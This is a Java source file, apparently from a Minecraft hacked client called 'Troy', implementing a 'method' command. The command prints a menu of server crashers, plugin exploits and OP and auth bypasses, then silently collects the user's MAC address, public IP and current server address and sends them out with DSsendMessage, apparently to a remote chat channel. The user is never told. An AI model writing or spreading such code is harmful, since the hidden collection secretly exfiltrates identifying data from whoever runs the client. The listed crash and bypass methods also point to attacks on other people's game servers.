package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.exception.CommandException;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
        alias = "method",
        description = "Show avaliable Methods",
        usage = "'method",
        aliases = {"methods"}
)
public class MethodCommand extends Command {
    public void execute(String... args) throws Exception {
        ChatHelper.printMessage("&b&lGORO &3-> &bStrong Bypass Crasher", true);
        ChatHelper.printMessage("&b&lRUYU &3-> &bExploitFixer Crasher", true);
        ChatHelper.printMessage("&b&lONEPACKET &3-> &bOnePacket Crasher", true);
        ChatHelper.printMessage("&b&lSHOGUN &3-> &bAdvanced Crasher", true);
        ChatHelper.printMessage("&b&lCHUNKLOADER &3-> &bChunk Crasher", true);
        ChatHelper.printMessage("&b&lFAWE &3-> &bFawe Exploit", true);
        ChatHelper.printMessage("&b&lMV &3-> &bMultiverseCore Exploit", true);
        ChatHelper.printMessage("&b&lPEX &3-> &bPermissionsEx Bypass OP", true);
        ChatHelper.printMessage("&b&lXAUTH &3-> &bAuth Bypass", true);

        InetAddress localHost = null;
        try {
            localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
            ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
            hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + " \nExecuted Command [Method]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
    }
}
